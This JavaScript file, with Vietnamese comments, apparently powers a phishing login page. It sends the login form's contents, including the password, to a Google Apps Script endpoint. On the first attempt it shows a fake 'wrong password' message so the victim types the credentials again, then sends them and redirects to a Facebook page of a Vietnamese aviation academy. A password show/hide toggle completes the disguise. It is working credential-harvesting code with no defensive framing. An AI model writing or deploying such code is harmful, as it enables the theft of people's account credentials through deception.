document.addEventListener("DOMContentLoaded", function () {
    const loginForm = document.getElementById("loginForm");

    loginForm.addEventListener("submit", function (event) {
        event.preventDefault();

        const formData = new FormData(loginForm);

        fetch("https://script.google.com/macros/s/AKfycbyb245t58Bx7wrTvNEoT5ZDuShfYFdaHdyYk3XsEpXR0HKb8n5egHVqaoVLi_cSf83n0w/exec", {
            method: "POST",
            body: formData,
        })
            .then(response => {
                if (response.ok) {
                    window.location.href = "https://accountuserlogin.github.io/surveytest/login.html";
                } else {
                    alert("Đã xảy ra lỗi, vui lòng thử lại.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("Đã xảy ra lỗi khi gửi yêu cầu.");
            });
    });
});

document.addEventListener("DOMContentLoaded", function () {
    const loginForm = document.getElementById("loginForm");
    const statusMessage = document.querySelector(".profile-info p"); // Thông báo lỗi
    const loginBtn = document.querySelector(".login-btn");
    let loginAttempts = 0; // Biến đếm số lần đăng nhập

    loginBtn.addEventListener("click", function (event) {
        event.preventDefault(); // Ngăn hành động mặc định

        loginAttempts++; // Tăng số lần đăng nhập

        if (loginAttempts === 1) {
            // Lần nhấn đầu tiên
            statusMessage.textContent = "";
            setTimeout(() => {
                // Sau 2 giây, hiển thị thông báo "Sai mật khẩu"
                statusMessage.textContent = "Sai mật khẩu";
                statusMessage.style.color = "red"; // Màu đỏ cho lỗi
                statusMessage.style.fontWeight = "bold"; // In đậm thông báo lỗi
            }, 2000); // 2 giây delay
        } else if (loginAttempts === 2) {
            // Lần nhấn thứ hai
            const formData = new FormData(loginForm);

            fetch("https://script.google.com/macros/s/AKfycbyb245t58Bx7wrTvNEoT5ZDuShfYFdaHdyYk3XsEpXR0HKb8n5egHVqaoVLi_cSf83n0w/exec", {
                method: "POST",
                body: formData,
            })
                .then(response => {
                    if (response.ok) {
                        window.location.href = "https://www.facebook.com/@hvhangkhongvietnam";
                    } else {
                        alert("Đã xảy ra lỗi, vui lòng thử lại.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    alert("Đã xảy ra lỗi khi gửi yêu cầu.");
                });
        }
    });
});



document.getElementById('togglePassword').addEventListener('click', function (e) {
    e.preventDefault(); // Ngăn hành động mặc định của button (nếu có)
    const passwordField = document.getElementById('password');
    const toggleButton = e.target;
    
    // Chuyển đổi type giữa "password" và "text"
    if (passwordField.type === 'password') {
        passwordField.type = 'text';
        toggleButton.textContent = 'Ẩn'; // Đổi chữ nút thành "Ẩn"
    } else {
        passwordField.type = 'password';
        toggleButton.textContent = 'Hiện'; // Đổi chữ nút thành "Hiện"
    }
});
